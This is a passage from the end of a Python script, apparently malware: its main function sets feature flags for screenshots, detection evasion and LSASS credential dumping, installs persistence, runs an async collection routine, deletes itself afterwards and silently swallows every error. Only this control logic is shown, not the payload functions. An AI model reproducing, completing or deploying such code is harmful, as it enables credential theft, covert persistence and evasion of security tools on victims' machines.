        FEATURES["screenshots"] = False
    if args.no_evade:
        FEATURES["evasion"] = False
    if args.lsass:
        FEATURES["lsass"] = True
    if args.only:
        wanted = {key.strip() for key in args.only.split(",") if key.strip()}
        for key in FEATURES:
            FEATURES[key] = key in wanted or key == "evasion"
    for key in (value.strip() for value in args.skip.split(",") if value.strip()):
        FEATURES[key] = False

    if args.persist:
        persist_add()

    asyncio.run(Runner().run(args.lsass))

    if args.self_delete:
        wipe()
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception:
        sys.exit(0)